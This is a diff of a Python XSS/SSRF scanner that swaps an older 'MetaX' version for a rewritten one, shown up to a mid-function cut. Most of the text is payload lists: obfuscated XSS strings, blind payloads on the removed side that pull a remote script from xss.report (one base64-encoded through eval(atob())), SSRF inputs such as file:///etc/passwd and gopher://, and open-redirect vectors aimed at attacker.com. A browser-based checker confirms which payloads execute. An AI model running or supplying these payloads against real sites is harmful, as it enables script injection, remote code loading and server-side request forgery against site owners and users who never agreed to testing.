@@ -1,1084 +1,1232 @@
 #!/usr/bin/env python3
-"""
-Next-Gen MetaX Scanner - Advanced Edition
+import asyncio,base64,httpx,logging,psutil,re,random,signal,datetime,html,json,os,sys,argparse,time,hashlib
+from collections import deque
+from dataclasses import dataclass,field
+from typing import List,Set,Optional,Dict,Any,Tuple
+from urllib.parse import urljoin,urlparse,parse_qs,urlencode,quote,unquote
+try:from bs4 import BeautifulSoup,Tag,NavigableString
+except ImportError:print("Install: pip install beautifulsoup4 lxml");sys.exit(1)
+try:from rich.console import Console;from rich.table import Table;from rich.panel import Panel;from rich.progress import Progress,BarColumn,TextColumn,TimeElapsedColumn,SpinnerColumn,TimeRemainingColumn;from rich.align import Align;from rich.box import HEAVY_HEAD;from rich.prompt import Prompt;from rich.text import Text
+except ImportError:print("Install: pip install rich");sys.exit(1)
+try:from playwright.async_api import async_playwright,Browser,Page,Dialog
+except ImportError:print("Install: pip install playwright && playwright install");sys.exit(1)
 
-Improvements in this version:
-- Extended and modernized payloads (including advanced Web API-based payloads).
-- Enhanced scoring system that now factors in advanced payload triggers.
-- Robust browser verification with better concurrency and logging.
-- Modular design with clear type hints and helper functions.
-"""
+logging.basicConfig(level=logging.INFO,format='%(asctime)s [%(levelname)s] %(message)s',filename='scan.log',filemode='w')
+logging.getLogger('httpx').setLevel(logging.ERROR)
+logging.getLogger('playwright').setLevel(logging.ERROR)
+log=logging.getLogger('scanner')
+console=Console(log_time=False)
 
-import sys, os, re, json, time, random, logging, asyncio, difflib, html, socket, argparse, hashlib, warnings
-from pathlib import Path
-from urllib.parse import urlparse, urljoin, parse_qsl, urlunparse, urlencode
-from typing import Any, Dict, List, Tuple, Optional, Set, Callable, Union
-import aiohttp
-from aiohttp import ClientTimeout, TCPConnector
-from aiohttp.abc import AbstractResolver
-import validators, psutil
-from bs4 import BeautifulSoup, XMLParsedAsHTMLWarning
-import importlib
-from collections import OrderedDict
+DIALOG_TAG=f"XSS_{random.randint(10000,99999)}"
+DOM_ATTR=f"data-xss-{random.randint(1000,9999)}"
+DOM_TAG=f"DOM_{random.randint(10000,99999)}"
+TAINT_TAG=f"TAINT_{random.randint(10000,99999)}"
+TAINT_ATTR=f"data-taint-{random.randint(1000,9999)}"
+SLEEP_TIME=3
 
-# --- Use lxml if available for faster parsing ---
-try:
-    import lxml  # noqa: F401
-    BS_PARSER = "lxml"
-except ImportError:
-    BS_PARSER = "html.parser"
+DOM_AGENT=f'''
+(function(){{
+const T="{TAINT_TAG}",A="{TAINT_ATTR}",U=window.location.hash.includes(T)?window.location.hash:window.location.search;
+if(!U.includes(T))return;
+function c(v,s){{if(typeof v==='string'&&v.includes(T)){{console.log("TAINT:"+s);document.body.setAttribute(A,s);}}return v;}}
+const p=Element.prototype,d=['innerHTML','outerHTML','srcdoc'];
+d.forEach(n=>{{const o=Object.getOwnPropertyDescriptor(p,n);if(o&&o.set)Object.defineProperty(p,n,{{set:function(v){{o.set.call(this,c(v,n));}},get:o.get,configurable:true}});}});
+const oS=p.setAttribute;p.setAttribute=function(n,v){{const s='setAttribute('+n+')';if(n.toLowerCase().startsWith('on')||['href','src','formaction','data','xlink:href','code'].includes(n.toLowerCase()))v=c(v,s);oS.call(this,n,v);}};
+const oI=p.insertAdjacentHTML;p.insertAdjacentHTML=function(pos,txt){{oI.call(this,pos,c(txt,'insertAdjacentHTML'));}};
+const oW=document.write;document.write=function(){{for(let i=0;i<arguments.length;i++)c(arguments[i],'document.write');oW.apply(document,arguments);}};
+const oH=Object.getOwnPropertyDescriptor(Location.prototype,'href');
+if(oH&&oH.set)Object.defineProperty(Location.prototype,'href',{{set:function(v){{oH.set.call(this,c(v,'location.href'));}},get:oH.get,configurable:true}});
+const oE=window.eval;window.eval=function(s){{c(s,'eval');return oE(s);}};
+const oF=window.Function;window.Function=function(){{if(arguments.length>0)c(arguments[arguments.length-1],'Function');return oF.apply(this,arguments);}};
+console.log("DOM Agent Active");
+}})();
+'''
 
-from playwright.async_api import async_playwright
-from rich.console import Console
-from rich.progress import Progress, SpinnerColumn, BarColumn, TimeElapsedColumn, TimeRemainingColumn, TextColumn
-from rich.panel import Panel
-from rich.prompt import Prompt
-from rich.table import Table
-from rich.theme import Theme
+@dataclass
+class Settings:
+    mode:str='COMPREHENSIVE'
+    crawl:str='static'
+    depth:int=15
+    verify:bool=True
+    debug:bool=False
+    filter:int=80
+    concurrency:int=200
+    timeout:int=15
+    max_targets:int=5000
+    reflect_tag:str=field(default_factory=lambda:f"R{random.randint(10000,99999)}")
+    od_domain:str='attacker.com'
+    uri_attrs:Tuple[str,...]=('href','src','action','formaction','data','url','codebase','background','poster','manifest','xlink:href','code','srcdoc')
+    event_attrs:Tuple[str,...]=('onload','onerror','onclick','onmouseover','onfocus','onblur','oninput','onchange','onsubmit','onanimationstart','ontransitionend','ontoggle')
+    od_params:Tuple[str,...]=('next','url','dest','redirect','to','location','return','goto','target','path','file','view','image','continue')
 
-# --- Suppress unnecessary warnings ---
-warnings.filterwarnings("ignore", category=XMLParsedAsHTMLWarning)
+@dataclass
+class Target:
+    method:str
+    url:str
+    params:Dict[str,str]=field(default_factory=dict)
+    vuln:str='XSS'
+    @property
+    def base(self):return self.url.split('?')[0].split('#')[0]
 
-# --- Global Configuration ---
-CF: Dict[str, Any] = {
-    "max_concurrency": 800,
-    "browser_concurrency": 100,
-    "adaptive_throttle": True,
-    "base_timeout": 1.0,
-    "max_retries": 1,
-    "browser_timeout": 15,
-    "browser_wait": 1.5,
-    "payload_randomization": True,
-    "score_filter": 40,
-    "baseline_samples": 3,
-    "baseline_retries": 3,
-    "cache_ttl": 300,
-    "max_cache_size": 1000,
-    "reflection_threshold": 0.8,
-    "concurrent_requests": 10,
-    "debug_mode": False,
-    "baseline_delay": 0.1,
-    "max_payloads_per_param": 20,
-    "browser_retry_attempts": 2,
-    "browser_passes": 3,
-    "required_success_rate": 1.0,
-    "browser_batch_size": 10,
-    "enable_gc_during_verification": False,
-    "use_dom_parser": True,
-    "fingerprint_cache_size": 100,
-    "verification_enabled": True,
-    "require_verification": True,
-    "blacklist_patterns": [r"login", r"logout", r"delete", r"remove"],
-    "content_type_patterns": {
-        "html": r"text/html|application/xhtml\+xml",
-        "json": r"application/json|text/json",
-        "xml": r"application/xml|text/xml",
-        "javascript": r"application/javascript|text/javascript",
-        "plain": r"text/plain"
-    },
-    "browser_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/96.0.4664.110 Safari/537.36",
-    "viewport": {"width": 1280, "height": 800},
-    "output_dir": "results_metax_advanced",
-    "realtime_file": "metax_scan_realtime.json",
-    "waf_evasion": False,
-    "nextjs_bypass": True,
-    "nextjs_bypass_payload": "middleware:middleware:middleware:middleware:middleware",
-    "browser_type": "chromium",
-    "scan_mode": "comprehensive",
-    "sandbox_verification": True,
-    "dashboard_enabled": False,
-    "crawl_depth": 3
-}
+@dataclass
+class Finding:
+    vuln:str='XSS'
+    type:str=''
+    severity:str='Medium'
+    score:int=80
+    base:str=''
+    url:str=''
+    param:str=''
+    payload:str=''
+    verify_type:str='dialog'
+    method:str='GET'
+    params:Dict[str,str]=field(default_factory=dict)
+    context:str=''
+    verified:bool=False
+    confidence:float=0.0
+    details:Dict[str,str]=field(default_factory=dict)
+    exploits:Set[str]=field(default_factory=set)
+    payloads:Set[str]=field(default_factory=set)
 
-def validate_config(config: Dict[str, Any]) -> None:
-    required_keys = ["max_concurrency", "cache_ttl", "output_dir", "browser_type", "scan_mode"]
-    for key in required_keys:
-        if key not in config:
-            raise ValueError(f"Missing required config key: {key}")
-
-validate_config(CF)
-Path(CF.get("output_dir")).mkdir(exist_ok=True)
-
-# --- Improved UI Theme & Console ---
-custom_theme = Theme({
-    "info": "bold bright_cyan",
-    "success": "bold bright_green",
-    "warning": "bold yellow",
-    "error": "bold red",
-    "step": "bold magenta",
-    "param": "italic bright_blue",
-    "highlight": "bold bright_yellow",
-    "critical": "bold white on red",
-    "debug": "dim white",
-    "menu": "bold bright_magenta",
-    "primary": "bold bright_magenta"
-})
-console = Console(theme=custom_theme)
-logging.basicConfig(level=logging.DEBUG if CF.get("debug_mode") else logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
-logger = logging.getLogger("metax_advanced")
-
-def timestamped_file(prefix: str, ext: str = "json") -> Path:
-    return Path(CF.get("output_dir")) / f"{prefix}_{time.strftime('%Y%m%d_%H%M%S')}.{ext}"
-
-def is_interesting(url: str) -> bool:
-    try:
-        static_ext = [".js", ".css", ".jpg", ".jpeg", ".png", ".gif", ".ico", ".pdf", ".zip", ".mp4", ".mp3"]
-        return not any(urlparse(url).path.lower().endswith(ext) for ext in static_ext)
-    except Exception:
-        return False
-
-# --- Advanced Detection Logic ---
-class AdvancedSmartDetection:
-    @staticmethod
-    def analyze_context(html_content: str) -> Dict[str, Any]:
-        triggers = ["alert(", "confirm(", "prompt(", "onerror=", "onload=", "javascript:", "onmouseover=", "onfocus=", "onresize="]
-        trigger_count = sum(html_content.lower().count(trigger) for trigger in triggers)
-        confidence = min(1.0, trigger_count / 3.0) if trigger_count > 0 else 0.0
-        return {"confidence": confidence, "trigger_count": trigger_count}
-
-    @staticmethod
-    def reduce_false_positives(score: int, metadata: Dict[str, Any]) -> int:
-        if "generic" in metadata.get("payload", "").lower():
-            score = int(score * 0.9)
-        if score < 20:
-            score = 0
-        return score
-
-# --- Plugin Manager ---
-class PluginManager:
-    def __init__(self, plugins_dir: str = "plugins") -> None:
-        self.plugins: List[Callable[[Any], Any]] = []
-        self.plugins_dir = plugins_dir
-        self.load_plugins()
-
-    def load_plugins(self) -> None:
-        if not os.path.isdir(self.plugins_dir):
-            return
-        for file in os.listdir(self.plugins_dir):
-            if file.endswith(".py"):
-                try:
-                    module_name = file[:-3]
-                    spec = importlib.util.spec_from_file_location(module_name, os.path.join(self.plugins_dir, file))
-                    module = importlib.util.module_from_spec(spec)
-                    spec.loader.exec_module(module)
-                    if hasattr(module, "run"):
-                        self.plugins.append(module.run)
-                except Exception as e:
-                    logger.error(f"Plugin error in {file}: {e}")
-
-    def run_plugins(self, vuln_result: "VulnResult") -> None:
-        for plugin in self.plugins:
-            try:
-                plugin(vuln_result)
-            except Exception as e:
-                logger.error(f"Plugin error during execution: {e}")
-
-# --- Builtin Resolver ---
-class BuiltinResolver(AbstractResolver):
-    async def resolve(self, host: str, port: int = 0, family: int = socket.AF_INET) -> List[Dict[str, Any]]:
-        loop = asyncio.get_running_loop()
-        infos = await loop.getaddrinfo(host, port, type=socket.SOCK_STREAM, family=family, proto=0, flags=socket.AI_ADDRCONFIG)
-        return [{"hostname": host, "host": a[0], "port": a[1], "family": fam, "proto": pr, "flags": 0} for (fam, _, pr, _, a) in infos]
-    async def close(self) -> None:
-        pass
-
-# --- Payload Manager ---
-class PayloadManager:
-    """
-    Provides various XSS payloads (base, advanced, context-aware, blind, and path) with randomization.
-    """
-    BASE_PAYLOADS: List[str] = [
-    # Logic-based and modern evasion payloads
-    '"><svg/onload=k=alert,k(\'MetaX_{rand}\')>',
-    '"><script>Function("al"+"ert(MetaX_{rand})")()</script>',
-    '"><script>setTimeout`al\\x65rt(MetaX_{rand})`</script>',
-    'javascript:/*--><svg/onload=alert(MetaX_{rand})>//-->',
-    '"><img src=x onerror=alert(MetaX_{rand})>',
-    '"><svg><script xlink:href="data:text/javascript,alert(MetaX_{rand})"></script></svg>',
-    '"><script>eval(String.fromCharCode(97,108,101,114,116,40,MetaX_{rand},41))</script>',
-    '"><script>`${alert(MetaX_{rand})}`</script>',
-    '{"x":"</script><script>alert(MetaX_{rand})</script>"}',
-    '"><iframe srcdoc="<script>alert(MetaX_{rand})</script>">',
-
-    # JS logic-chain based payloads (URL encoded)
-    '%22%3E%27-((k=alert)&&k(...[MetaX_{rand}]))-%27',
-    '%22%3E%27-((k=alert)=>k(MetaX_{rand}))()-%27',
-    '%22%3E%27-(+!k&&k=alert,k(MetaX_{rand}))-%27',
-    '%22%3E%27-(0,k=alert,k?.(MetaX_{rand}))-%27',
-    '%22%3E%27-((k=alert).bind``(MetaX_{rand}))-%27',
-    '%22%3E%27-(f=Function,f(\'al\'+\'ert(MetaX_{rand})\')())-%27',
-    '%22%3E%27-(a=>a(MetaX_{rand}))(k=alert)-%27',
-    '%22%3E%27-((k=alert),`${k(MetaX_{rand})}`)-%27',
-    '%22%3E%27-(k=\\u0061lert,k(MetaX_{rand}))-%27',
-    '%22%3E%27-(k=String.raw,k=alert,k`MetaX_{rand}`)-%27',
-    '%22%3E%27-(A=Object.getOwnPropertyDescriptor(window,\'location\').get,A({toString:_=>{k=alert;k(MetaX_{rand})}}))-%27',
-    '%22%3E%27-(([k]=[alert],k(MetaX_{rand})))-%27',
-    '%22%3E%27-(this )-%27',
-    '%22%3E%27-(($={0:alert}) )-%27',
-    '%22%3E%27-(Object.defineProperty(this,\'x\',{get:()=>alert(MetaX_{rand})}),x)-%27',
-    '%22%3E%27-(URL.createObjectURL(new Blob([\'alert(MetaX_{rand})\'],{type:\'text/javascript\'})))-%27',
-    '%22%3E%27-(()=>(f=document.body.appendChild(document.createElement`iframe`),f.srcdoc=\'\'+String.raw`<script>alert(MetaX_{rand})<\\/script>`))()-%27',
-    '%22%3E%27-(async()=>{(await\'\'),alert(MetaX_{rand})})()-%27',
-    '%22%3E%27-(new Map([[0,alert]])).get(0)(MetaX_{rand})-%27',
-    '%22%3E%27-(k=alert,/a/.test({toString:()=>k(MetaX_{rand})}))-%27',
-    'Function(\'\\x61\\x6c\\x65\\x72\\x74(MetaX_{rand})\')()',
-
-    # onmouseover payloads
-    'onmouseover="(k=alert,k(MetaX_{rand}))"',
-    'onmouseover="(()=>alert(MetaX_{rand}))()"',
-    'onmouseover="(async()=>{await 0;alert(MetaX_{rand})})()"',
-    'onmouseover="({get x(){alert(MetaX_{rand})}}).x"',
-    'onmouseover="([a]=[alert],a(MetaX_{rand}))"',
-    'onmouseover="`${alert(MetaX_{rand})}`"',
-    'onmouseover="(f=Function)(\'al\'+\'ert(MetaX_{rand})\')()"',
-    'onmouseover="setTimeout`al\\x65rt(MetaX_{rand})`"',
-    'onmouseover="alert.bind``(MetaX_{rand})"',
-    'onmouseover="(k=alert,k?.(MetaX_{rand}))"',
-    'onmouseover="([][[]]+[])[+!![]]+(k=alert,k(MetaX_{rand}))"',
-    '<div onmouseover=alert(MetaX_{rand})>',
-    '<div onmouseover=(()=>alert(MetaX_{rand}))()>'
-]
-
-    ADVANCED_PAYLOADS: List[str] = [
-        # JSON and Attribute Injection Variants
-        '{"key": "<svg/onload=alert(\'XSS_{rand}\')>"}',
-        '{"callback": "javascript:confirm(\'XSS_{rand}\')"}',
-        # HTML5 Event Handlers and Inline Scripting
-        '"><a href="#" data-xss="eval(this.dataset.xss)" onclick="prompt(\'XSS_{rand}\')">click</a>',
-        '"><video src=x onerror=alert(\'XSS_{rand}\')>',
-        '"><audio src=x onerror=alert(\'XSS_{rand}\')>',
-        '"><div contenteditable onfocus=alert(\'XSS_{rand}\')>edit me</div>',
-        '"><marquee onstart=alert(\'XSS_{rand}\')>scroll</marquee>',
-        # Modern Browser DOM Manipulation
-        '"><script>document.body.innerHTML=`<img src=x onerror=alert("XSS_{rand}")>`</script>',
-        '"><script>fetch("https://xss.report/c/or0to");</script>',
-        # Advanced Function-Based Payloads
-        '"><script>((x)=>{ window.location.href=`javascript:alert("${x}")` })("XSS_{rand}")</script>',
-        '"><script>Promise.resolve().then(()=>alert("XSS_{rand}"))</script>',
-        # Event Handling Variations
-        '"><span onmouseover="alert(\'XSS_{rand}\')">hover me</span>',
-        '"><div onmouseenter="alert(\'XSS_{rand}\')">mouse enter</div>',
-        # Advanced SVG and Character Encoding Techniques
-        '"><svg/onload=alert(String.fromCharCode(88,83,83,95,{rand}))>',
-        '"><img src=x onerror=prompt(String.fromCharCode(88,83,83,95,{rand}))>',
-        # Modern HTML5 and Web API Exploits
-        '"><iframe srcdoc="<script>alert(\'XSS_{rand}\')</script>">',
-        '"><object data="javascript:alert(\'XSS_{rand}\')">',
-        '"><embed src="javascript:alert(\'XSS_{rand}\')">',
-        # CSS and Style-Based Injection
-        '"><style>@import url("javascript:alert(\'XSS_{rand}\')");</style>',
-        '"><link rel="stylesheet" href="data:text/css;base64,YSB7IGFsZXJ0KCdYU1NfcmFuZCcpIH0=">',
-        # SVG and XML-Based Injections
-        '"><svg><script>alert(\'XSS_{rand}\')</script>',
-        '"><svg><desc><![CDATA[</desc><script>alert(\'XSS_{rand}\')]</script>',
-        # HTML5 Custom Elements and Shadow DOM
-        '"><custom-element onclick="alert(\'XSS_{rand}\')">Click Me</custom-element>',
-        # Modern Web API Exploits
-        '"><script>navigator.sendBeacon("https://xss.report/c/or0to", "payload=XSS_{rand}");</script>',
-        # Mutation Observer and Dynamic Script Injection
-        '"><script>new MutationObserver(()=>alert("XSS_{rand}")).observe(document.body,{childList:true})</script>',
-        # Exotic Escape and Encoding Techniques
-        '"><script>eval(decodeURIComponent("%61%6C%65%72%74%28%27%58%53%53%5F%72%61%6E%64%27%29"))</script>',
-        # WebRTC and Advanced Communication Channel Payloads
-        '"><script>RTCPeerConnection && new RTCPeerConnection().createDataChannel("xss").send("XSS_{rand}")</script>'
-        ]
-    CONTEXT_PAYLOADS: Dict[str, List[str]] = {
-        "html": [
-            '"><script>alert(\'MetaX_{rand}\')</script>',
-            '"><svg/onload=alert(\'MetaX_{rand}\')>',
-            '"><img src=x onerror=alert(\'MetaX_{rand}\')>',
-            '`"><script>eval(`alert("MetaX_{rand}")`);</script>',
-            '"><!--<script>alert(\'MetaX_{rand}\')</script>-->',
-            '"><b onmouseover=alert(\'MetaX_{rand}\')>test</b>',
-            '"><a href="#" onclick="alert(\'MetaX_{rand}\')">click</a>',
-            '"><div style="background-image: url(javascript:alert(\'MetaX_{rand}\'));">'
+def load_payloads():
+    b64=base64.b64encode(f'confirm("{DIALOG_TAG}")'.encode()).decode()
+    delay=f"Set.constructor`setTimeout(\\'confirm(\\'{DIALOG_TAG}\\')\\'',{SLEEP_TIME*1000})`()"
+    od_vecs=[f"//{Settings.od_domain}",f"https://{Settings.od_domain}",f"https://%09{Settings.od_domain}/"]
+    ssrf=['file:///etc/passwd','dict://localhost:6379/','gopher://127.0.0.1:80/']
+    
+    return {
+        'HTML_TAG':[
+            (f'<svg/onload=confirm("{DIALOG_TAG}")>','SVG_ONLOAD','Critical',100,'dialog'),
+            (f'<img src=x onerror="document.body.setAttribute(\'{DOM_ATTR}\',\'{DOM_TAG}\')">','IMG_DOM','Critical',100,'dom'),
+            (f'<script>confirm("{DIALOG_TAG}")</script>','SCRIPT','Critical',100,'dialog'),
+            (f'<object data="data:text/html;base64,{b64}"></object>','OBJECT_B64','Critical',100,'dialog'),
+            (f'<details ontoggle=confirm("{DIALOG_TAG}") open>','DETAILS','High',95,'dialog'),
         ],
-        "href": [
-            'javascript:alert(\'MetaX_{rand}\')',
-            'data:text/html,<script>alert("MetaX_{rand}")</script>',
-            'vbscript:msgbox("MetaX_{rand}")',
-            'javascript:confirm(\'MetaX_{rand}\')',
-            'data:text/html;base64,PHNjcmlwdD5hbGVydCgnTWV0YVhfJyk8L3NjcmlwdD4=',
-            'javascript:prompt(\'MetaX_{rand}\')',
-            'javascript:window.location="javascript:alert(\'MetaX_{rand}\')"'
-        ]
+        'CONSUMING':[
+            (f'</title><svg/onload=confirm("{DIALOG_TAG}")>','TITLE_BREAK','Critical',100,'dialog'),
+            (f'</textarea><svg/onload=confirm("{DIALOG_TAG}")>','TEXTAREA_BREAK','Critical',100,'dialog'),
+            (f'</script><svg/onload=confirm("{DIALOG_TAG}")>','SCRIPT_BREAK','Critical',100,'dialog'),
+            (f'--></style><script>confirm("{DIALOG_TAG}")</script>','STYLE_BREAK','Critical',100,'dialog'),
+        ],
+        'FOCUS':[
+            (f'<div onfocus=confirm("{DIALOG_TAG}") id=x tabindex=1>','TABINDEX','Critical',100,'dialog'),
+            (f'<video><track default onload=confirm("{DIALOG_TAG}") src="data:text/vtt,WEBVTT"></video>','TRACK','High',95,'dialog'),
+        ],
+        'TRANSITION':[
+            (f'<style>@keyframes x{{}}</style><b style="animation-name:x" onanimationstart="confirm(\'{DIALOG_TAG}\')"></b>','ANIMATION','Critical',100,'dialog'),
+            (f'url("javascript:confirm(\'{DIALOG_TAG}\')")', 'CSS_URL', 'Critical', 100, 'dialog')
+
+        ],
+        'QUOTED_ATTR':[
+            (f'"><svg/onload=confirm("{DIALOG_TAG}")>','ATTR_BREAK','Critical',100,'dialog'),
+            (f'"\' autofocus onfocus="confirm(\'{DIALOG_TAG}\')','EVENT','High',90,'dialog'),
+        ],
+        'UNQUOTED_ATTR':[
+            (f' onfocus=confirm("{DIALOG_TAG}") autofocus','UNQUOTED_EVENT','Critical',100,'dialog'),
+            (f'><svg/onload=confirm("{DIALOG_TAG}")','TAG_BREAK','High',95,'dialog'),
+        ],
+        'URI_ATTR':[
+            (f'javascript:confirm("{DIALOG_TAG}")','JS_SCHEME','Critical',100,'dialog'),
+            (f'data:text/html;base64,{b64}','DATA_SCHEME','Critical',100,'dialog'),
+            (f'jav%0ascript:confirm("{DIALOG_TAG}")','JS_BYPASS','Critical',100,'dialog'),
+        ],
+        'JS_STRING':[
+            (f"';confirm('{DIALOG_TAG}')//","JS_SINGLE","Critical",100,'dialog'),
+            (f'";confirm("{DIALOG_TAG}")//','JS_DOUBLE','Critical',100,'dialog'),
+            (f"`confirm('{DIALOG_TAG}')`",'JS_TEMPLATE','Critical',98,'dialog'),
+        ],
+        'JS_RAW':[
+            (f'onerror=confirm,`{DIALOG_TAG}`//','JS_THROW','Critical',100,'dialog'),
+            (f"Set.constructor`confirm('{DIALOG_TAG}')`()",'JS_CONSTRUCTOR','Critical',100,'dialog'),
+        ],
+        'TEMPLATE':[
+            (f'{{{{constructor.constructor(\'confirm("{DIALOG_TAG}")\')()}}}}', 'ANGULAR', 'Critical', 100, 'dialog')
+
+        ],
+        'BLIND':[
+            (delay,'TIME_DELAY','Critical',90,'time'),
+        ],
+        'OD':[
+            (v,f'OD_{i}','High',95,'redirect') for i,v in enumerate(od_vecs,1)
+        ],
+        'SSRF':[
+            (v,f'SSRF_{i}','High',95,'redirect') for i,v in enumerate(ssrf,1)
+        ],
+        'HTML_TEXT':[
+            (f'<svg/onload=confirm("{DIALOG_TAG}")>','TEXT','Critical',98,'dialog'),
+        ],
+        'JS_COMMENT':[
+            (f"*/confirm('{DIALOG_TAG}')/*",'COMMENT_BREAK','Critical',70,'dialog'),
+        ],
     }
-    BLIND_PAYLOADS: List[str] = [
-        '\'"><script src="https://xss.report/c/or0to"></script>',
-        '"><img src=x id="dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzLnJlcG9ydC9jL29yMHRvIjtkb2N1bWVudC5ib2R5LmFwcGVuZENoaWxkKGEpOw==" onerror=eval(atob(this.id))>',
-        'javascript:eval(\'var a=document.createElement("script");a.src="https://xss.report/c/or0to";document.body.appendChild(a)\')',
-        '"><script>fetch("https://xss.report/c/or0to")</script>',
-        '"><iframe src="https://xss.report/c/or0to" style="display:none"></iframe>'
-    ]
-    PATH_PAYLOADS: List[str] = [
-        "javascript:alert('MetaX_{rand}')",
-        "data:text/html,<script>alert('MetaX_{rand}')</script>",
-        "vbscript:msgbox('MetaX_{rand}')",
-        "javascript:confirm('MetaX_{rand}')",
-        "javascript:prompt('MetaX_{rand}')",
-        "javascript:window.location='javascript:alert(\\'MetaX_{rand}\\')'"
-    ]
+
+PAYLOADS=load_payloads()
+
+class Stats:
+    def __init__(self):
+        self.targets_found=0
+        self.targets_scanned=0
+        self.reflections=0
+        self.findings=0
+        self.verified=0
+        self.high_confidence=0
+        self.start_time=time.time()
     
-    @staticmethod
-    def _replace_rand(payload: str, rand: Optional[str] = None) -> str:
-        if rand is None:
-            rand = str(random.randint(10000, 99999))
-        return payload.replace("{rand}", rand)
+    def get_panel(self):
+        elapsed=time.time()-self.start_time
+        rate=self.targets_scanned/(elapsed+0.001)
+        
+        stats_text=f"""[cyan]Targets:[/cyan] {self.targets_scanned}/{self.targets_found} | [yellow]Rate:[/yellow] {rate:.1f}/s
+[green]Reflections:[/green] {self.reflections} | [magenta]Findings:[/magenta] {self.findings}
+[bold green]Verified:[/bold green] {self.verified} | [bold yellow]High Confidence:[/bold yellow] {self.high_confidence}
+[dim]Elapsed:[/dim] {int(elapsed//60)}m {int(elapsed%60)}s"""
+        
+        return Panel(Align.center(stats_text),title='[bold blue]Live Stats[/bold blue]',border_style='cyan',padding=(0,2))
+
+class Health:
+    def __init__(self,settings,manager):
+        self.settings=settings
+        self.manager=manager
+        self.cpu=0.0
+        self.mem=0.0
     
-    @classmethod
-    def generate(cls, count: Optional[int] = None) -> List[str]:
-        all_payloads = [cls._replace_rand(p) for p in (cls.BASE_PAYLOADS + cls.ADVANCED_PAYLOADS)]
-        if CF.get("payload_randomization"):
-            random.shuffle(all_payloads)
-        if count is not None and count < len(all_payloads):
-            return random.sample(all_payloads, count)
-        return all_payloads
-
-    @classmethod
-    def generate_context_aware(cls, ctx: Optional[Union[str, List[str]]] = None) -> Dict[str, List[str]]:
-        if isinstance(ctx, str):
-            contexts = [ctx]
-        elif isinstance(ctx, list):
-            contexts = ctx
-        else:
-            contexts = list(cls.CONTEXT_PAYLOADS.keys())
-        rand = str(random.randint(10000, 99999))
-        return {k: [cls._replace_rand(p, rand) for p in cls.CONTEXT_PAYLOADS.get(k, [])] for k in contexts}
-
-    @classmethod
-    def get_all_payloads(cls) -> Dict[str, List[str]]:
-        return {
-            "base": [cls._replace_rand(p) for p in cls.BASE_PAYLOADS],
-            "advanced": [cls._replace_rand(p) for p in cls.ADVANCED_PAYLOADS],
-            "context": cls.generate_context_aware(),
-            "blind": [cls._replace_rand(p) for p in cls.BLIND_PAYLOADS],
-            "path": [cls._replace_rand(p) for p in cls.PATH_PAYLOADS]
-        }
-
-# --- Browser Hook for DOM Event Logging ---
-BROWSER_HOOK = r"""
-window.__METAXLOG = [];
-(function(){
-  function push(msg){ window.__METAXLOG.push(new Date().toISOString()+"-"+msg); }
-  window.alert = function(m){ push("alert:"+m); return m; };
-  window.confirm = function(m){ push("confirm:"+m); return true; };
-  window.prompt = function(m,d){ push("prompt:"+m); return d; };
-  new MutationObserver(function(muts){
-    muts.forEach(function(m){
-      if(m.type==='childList'){
-        m.addedNodes.forEach(function(n){
-          if(n.nodeName==='SCRIPT') push("script:"+n.textContent.substring(0,100));
-        });
-      }
-    });
-  }).observe(document, {childList:true, subtree:true});
-  push("metax-monitor-initialized");
-})();
-"""
-
-# --- Adaptive Scheduler ---
-class AdaptiveScheduler:
-    @staticmethod
-    def concurrency(max_val: int) -> int:
-        if not CF.get("adaptive_throttle"):
-            return max_val
-        cpu = psutil.cpu_percent(interval=0.1)
-        mem = psutil.virtual_memory().percent
+    async def update(self):
         try:
-            load = psutil.getloadavg()[0]
-        except Exception:
-            load = 0.0
-        cores = psutil.cpu_count() or 1
-        factor = 1.0 - ((cpu + mem) / 100) - (0.5 * (load / cores))
-        factor = max(0.1, min(1.2, factor))
-        return max(1, int(max_val * factor))
-
-# --- LRU Cache using OrderedDict ---
-class LRUCache:
-    def __init__(self, capacity: int) -> None:
-        self.capacity: int = capacity
-        self.cache: OrderedDict[Any, Any] = OrderedDict()
-    def get(self, key: Any) -> Optional[Any]:
-        if key in self.cache:
-            self.cache.move_to_end(key)
-            return self.cache[key]
-        return None
-    def set(self, key: Any, value: Any) -> None:
-        if key in self.cache:
-            self.cache.move_to_end(key)
-        self.cache[key] = value
-        if len(self.cache) > self.capacity:
-            self.cache.popitem(last=False)
-
-# --- DOM Parser ---
-class DOMParser:
-    def extract_structure(self, html_content: str) -> str:
-        try:
-            if "<xml" in html_content.lower():
-                soup = BeautifulSoup(html_content, features="xml")
+            self.cpu=psutil.cpu_percent()
+            self.mem=psutil.virtual_memory().percent
+        except:return
+        
+        cap=self.settings.concurrency
+        if self.mem>90:cap=max(5,cap//6)
+        elif self.cpu>90:cap=max(10,cap//4)
+        elif self.mem>80 or self.cpu>75:cap=max(20,cap//2)
+        
+        if cap!=self.settings.concurrency:
+            diff=cap-self.settings.concurrency
+            self.settings.concurrency=cap
+            if diff>0:
+                for _ in range(diff):self.manager.sem.release()
             else:
-                soup = BeautifulSoup(html_content, BS_PARSER)
-            return " ".join(tag.name for tag in soup.find_all())
-        except Exception:
-            return ""
-    def extract_event_handlers(self, html_content: str) -> List[str]:
-        soup = BeautifulSoup(html_content, BS_PARSER)
-        return [str(tag.attrs) for tag in soup.find_all() if any(attr.lower().startswith("on") for attr in tag.attrs)]
-    def heuristic_obfuscation_check(self, html_content: str) -> bool:
-        return bool(re.search(r"(\\x|\\u|%[0-9A-Fa-f]{2}){3,}", html_content))
-
-# --- Extended Scoring Engine ---
-class ScoreEngine:
-    @staticmethod
-    def strip_html(text: str) -> str:
-        soup = BeautifulSoup(text, BS_PARSER)
-        for tag in soup(["script", "style", "noscript", "iframe", "svg", "img", "object", "embed", "form", "input", "button", "textarea"]):
-            tag.decompose()
-        return soup.get_text(separator=" ", strip=True)
+                asyncio.create_task(self._acquire(abs(diff)))
     
-    @staticmethod
-    def check_encodings(payload: str, response: str) -> Dict[str, bool]:
-        unescaped_payload = html.unescape(payload)
-        return {"raw": payload in response, "unescaped": unescaped_payload in response}
+    async def _acquire(self,n):
+        for _ in range(n):
+            try:await self.manager.sem.acquire()
+            except:break
 
-    @staticmethod
-    def compute_score(payload: str, baseline: str, response: str, base_latency: float, resp_latency: float) -> Tuple[int, str]:
-        norm_payload = payload.strip()
